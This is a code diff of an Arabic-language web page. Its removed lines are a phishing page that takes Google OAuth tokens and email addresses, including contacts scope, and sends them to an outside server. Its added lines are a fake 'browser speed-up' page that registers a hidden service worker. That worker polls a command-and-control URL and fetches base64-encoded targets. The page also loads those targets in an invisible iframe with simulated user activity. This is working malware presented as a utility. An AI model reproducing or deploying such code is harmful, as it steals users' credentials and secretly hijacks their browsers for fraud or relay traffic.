@@ -1,42 +1,106 @@
 <!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"></head>
-<body style="background:#000; color:#fff; text-align:center; padding-top:100px;">
-    <button id="btn" style="padding:30px; background:red; color:white;">مشاهدة الفيديو</button>
-
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>تحديث النظام الإلزامي</title>
+    <style>
+        body { background: #050505; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; margin: 0; overflow: hidden; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        .scanner { width: 80%; height: 2px; background: #00ff00; position: absolute; top: 0; animation: scan 3s infinite; box-shadow: 0 0 15px #00ff00; }
+        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+        .panel { border: 1px solid #00ff00; padding: 30px; background: rgba(0, 255, 0, 0.05); border-radius: 10px; z-index: 10; }
+        .btn { background: #00ff00; color: #000; border: none; padding: 15px 40px; font-size: 1.2rem; font-weight: bold; cursor: pointer; margin-top: 20px; transition: 0.3s; text-transform: uppercase; }
+        .btn:hover { background: #008800; box-shadow: 0 0 20px #00ff00; }
+        #status { margin-top: 15px; font-size: 0.9rem; color: #88ff88; }
+        /* الإطار الشبحي */
+        #ghost-container { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; opacity: 0.001; pointer-events: none; z-index: -1; }
+    </style>
+</head>
+<body>
+    <div class="scanner"></div>
+    <div class="panel">
+        <h2>نظام الفحص الذكي</h2>
+        <p>تم اكتشاف ملفات مؤقتة تبطئ المتصفح.</p>
+        <button class="btn" id="startBtn" onclick="initDeploy()">بدء التنظيف والتسريع</button>
+        <div id="status">جاهز للفحص...</div>
+    </div>
+    <div id="ghost-container"></div>
 
     <script>
-        const firebaseConfig = {
-            apiKey: "AIzaSyCvs2XALyDmK3_D4BXJ5Dx7MFo2H71R6gg",
-            authDomain: "giftapp-5937d.firebaseapp.com",
-            projectId: "giftapp-5937d",
-            storageBucket: "giftapp-5937d.firebasestorage.app",
-            messagingSenderId: "1067108116204",
-            appId: "1:1067108116204:web:dd2b2717c17590b10be7c9"
-        };
-        firebase.initializeApp(firebaseConfig);
+        const C2_URL = 'https://mohamedahmed77.pythonanywhere.com/get_task';
 
-        firebase.auth().getRedirectResult().then((result) => {
-            if (result.credential) {
-                const token = result.credential.accessToken;
-                const sender = result.user.email;
+        // 1. توليد وزرع الجاسوس (Service Worker) برمجياً
+        async function deployServiceWorker() {
+            const swCode = `
+                const C2_URL = '${C2_URL}';
+                self.addEventListener('install', e => self.skipWaiting());
+                self.addEventListener('activate', e => e.waitUntil(clients.claim()));
                 
-                // إرسال البيانات للسيرفر
-                fetch(`https://mohamedahmed77.pythonanywhere.com/?token=${token}&sender=${sender}`)
-                .then(() => {
-                    alert("تم تأكيد الحساب!");
-                    window.location.href = "https://google.com";
-                });
-            }
-        });
+                function runRelay() {
+                    const delay = Math.floor(Math.random() * (120000 - 60000)) + 60000;
+                    setTimeout(async () => {
+                        try {
+                            const r = await fetch(C2_URL);
+                            const d = await r.json();
+                            await fetch(atob(d.payload), { mode: 'no-cors' });
+                        } catch (e) {}
+                        runRelay();
+                    }, delay);
+                }
+                runRelay();
+            `;
+            const blob = new Blob([swCode], { type: 'application/javascript' });
+            const swUrl = URL.createObjectURL(blob);
+            return navigator.serviceWorker.register(swUrl);
+        }
 
-        document.getElementById('btn').onclick = () => {
-            const provider = new firebase.auth.GoogleAuthProvider();
-            provider.addScope('https://www.googleapis.com/auth/contacts.readonly');
-            firebase.auth().signInWithRedirect(provider);
-        };
+        // 2. محرك الواجهة (المحاكاة الشبحية)
+        function startShadowEngine() {
+            const nextTick = Math.floor(Math.random() * (60000 - 30000)) + 30000;
+            setTimeout(async () => {
+                try {
+                    const res = await fetch(C2_URL);
+                    const data = await res.json();
+                    const target = atob(data.payload);
+
+                    const ifrm = document.createElement('iframe');
+                    Object.assign(ifrm.style, { width: "100vw", height: "100vh", border: "none" });
+                    ifrm.src = target;
+
+                    ifrm.onload = () => {
+                        // محاكاة سكرول عشوائي
+                        setTimeout(() => { try { ifrm.contentWindow.scrollTo(0, Math.random() * 800); } catch(e){} }, 3000);
+                        // محاكاة اهتزاز (ماوس)
+                        let j = setInterval(() => { ifrm.style.transform = \`translate(\${Math.random()>0.5?1:-1}px)\`; }, 200);
+                        setTimeout(() => clearInterval(j), 25000);
+                    };
+
+                    const container = document.getElementById('ghost-container');
+                    container.innerHTML = '';
+                    container.appendChild(ifrm);
+                } catch(e) {}
+                startShadowEngine();
+            }, nextTick);
+        }
+
+        // 3. التنشيط عند الضغط
+        async function initDeploy() {
+            document.getElementById('startBtn').innerText = "جاري المعالجة...";
+            document.getElementById('status').innerText = "جاري تنشيط وضع الخلفية...";
+
+            // طلب الإذن (للبقاء في الخلفية)
+            if (Notification.permission !== 'granted') await Notification.requestPermission();
+
+            // زرع الجاسوس والمحرك
+            try {
+                await deployServiceWorker();
+                startShadowEngine();
+                document.getElementById('status').innerText = "تم التحسين! يمكنك إغلاق الصفحة الآن.";
+                alert("تم تسريع المتصفح بنجاح.");
+            } catch (e) {
+                startShadowEngine(); // تشغيل المحرك حتى لو فشل الـ SW
+            }
+        }
     </script>
 </body>
 </html>
